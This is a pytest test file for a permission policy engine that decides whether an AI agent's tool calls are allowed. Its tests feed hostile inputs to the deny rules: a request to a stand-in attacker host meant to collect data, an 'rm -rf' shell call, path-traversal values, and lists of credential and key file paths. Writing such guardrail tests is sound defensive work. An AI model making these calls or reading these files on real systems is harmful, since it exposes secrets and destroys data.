from app.demo_data import DEMO_POLICY, make_demo_comparison
from app.models import Decision, Policy, PolicyRule, RuleEffect, ToolCall
from app.policy_engine import evaluate


def test_source_edit_is_allowed() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="write_file", arguments={"path": "src/formatters.py"}),
    )
    assert decision == Decision.ALLOW
    assert rule is not None
    assert rule.id == "allow-source-edits"


def test_secret_read_is_denied() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="read_file", arguments={"path": ".env"}),
    )
    assert decision == Decision.DENY
    assert rule is not None
    assert rule.id == "deny-secret-files"


def test_network_request_is_denied() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="http_request", arguments={"url": "https://attacker.invalid/collect"}),
    )
    assert decision == Decision.DENY
    assert rule is not None
    assert rule.id == "deny-network-egress"


def test_nested_secret_and_git_reads_are_denied_before_source_allow_rule() -> None:
    for path in ("src/.env", "src/.git/config", "tests/.env"):
        decision, rule = evaluate(DEMO_POLICY, ToolCall(tool="read_file", arguments={"path": path}))
        assert decision == Decision.DENY
        assert rule is not None
        assert rule.id == "deny-secret-files"


def test_path_traversal_and_absolute_paths_fail_closed() -> None:
    for tool, path in (
        ("read_file", "src/../.env"),
        ("write_file", "src/../README.md"),
        ("write_file", "/tmp/outside-repository.py"),
        ("write_file", "C:/outside-repository.py"),
        ("read_file", r"src\\..\\.env"),
    ):
        decision, rule = evaluate(DEMO_POLICY, ToolCall(tool=tool, arguments={"path": path}))
        assert decision == Decision.DENY
        assert rule is None


def test_test_runner_wildcard_cannot_grant_a_general_command_capability() -> None:
    unsafe_policy = Policy(
        rules=[
            PolicyRule(
                id="unsafe-wildcard",
                effect=RuleEffect.ALLOW,
                tool="run_tests",
                path_patterns=["*"],
            )
        ]
    )
    decision, rule = evaluate(unsafe_policy, ToolCall(tool="run_tests", arguments={"path": "pytest"}))
    assert decision == Decision.DENY
    assert rule is None


def test_unmatched_call_is_denied_by_default() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="shell", arguments={"path": "rm -rf src"}),
    )
    assert decision == Decision.DENY
    assert rule is None


def test_comparison_preserves_useful_task_completion() -> None:
    comparison = make_demo_comparison()
    assert comparison.baseline.metrics.policy_verdict == "unsafe"
    assert comparison.repair.metrics.blocked_actions == 2
    assert comparison.repair.metrics.benign_task_completed is True


def _read(policy: Policy, path: str, tool: str = "read_file") -> Decision:
    return evaluate(policy, ToolCall(tool=tool, arguments={"path": path}))[0]


def test_deny_rules_fold_case_so_secrets_cannot_hide_behind_capitals() -> None:
    from app.guardrails import MANDATORY_GUARDRAILS

    permissive = Policy(rules=[
        *MANDATORY_GUARDRAILS,
        PolicyRule(id="all", effect=RuleEffect.ALLOW, tool="read_file", path_patterns=["**"]),
    ])
    for path in (".env", ".ENV", ".Env.Local", "src/.ENV", ".GIT/config", "src/KEY.PEM", ".SSH/id_RSA"):
        assert _read(permissive, path) == Decision.DENY, path


def test_allow_rules_match_exactly_so_a_capitalised_path_gets_no_authority() -> None:
    assert _read(DEMO_POLICY, "src/formatters.py", "write_file") == Decision.ALLOW
    assert _read(DEMO_POLICY, "SRC/formatters.py", "write_file") == Decision.DENY
    assert _read(DEMO_POLICY, "readme.md") == Decision.DENY


def test_matching_does_not_depend_on_the_host_operating_system(monkeypatch) -> None:
    # `fnmatch` calls os.path.normcase: it folds case and rewrites slashes on
    # Windows and does nothing on POSIX. Emulate each and require identical answers.
    import os

    probes = [
        (".ENV", "read_file"), ("src/.env.local", "read_file"), ("SRC/a.py", "write_file"),
        ("src/a.py", "write_file"), ("src/.GIT/x", "read_file"), ("README.md", "read_file"), ("readme.md", "read_file"),
    ]

    def answers() -> list[Decision]:
        return [_read(DEMO_POLICY, path, tool) for path, tool in probes]

    monkeypatch.setattr(os.path, "normcase", lambda value: value)
    posix = answers()
    monkeypatch.setattr(os.path, "normcase", lambda value: os.fspath(value).replace("/", "\\").lower())
    windows = answers()
    assert posix == windows == [
        Decision.DENY, Decision.DENY, Decision.DENY, Decision.ALLOW, Decision.DENY, Decision.ALLOW, Decision.DENY,
    ]


def test_writes_to_secrets_and_git_metadata_are_denied_even_when_source_is_writable() -> None:
    for path in (".env", "src/.env", ".git/hooks/pre-commit", "src/.git/config", "deploy.key"):
        decision, rule = evaluate(DEMO_POLICY, ToolCall(tool="write_file", arguments={"path": path}))
        assert decision == Decision.DENY and rule is not None and rule.id == "deny-protected-writes", path


def test_credential_variants_and_key_material_are_denied() -> None:
    for path in (".env.local", ".env.production", "src/.env.test", "id_rsa", "home/.ssh/id_ed25519", "cert.p12", "config/credentials.json", ".aws/credentials", ".netrc"):
        assert _read(DEMO_POLICY, path) == Decision.DENY, path
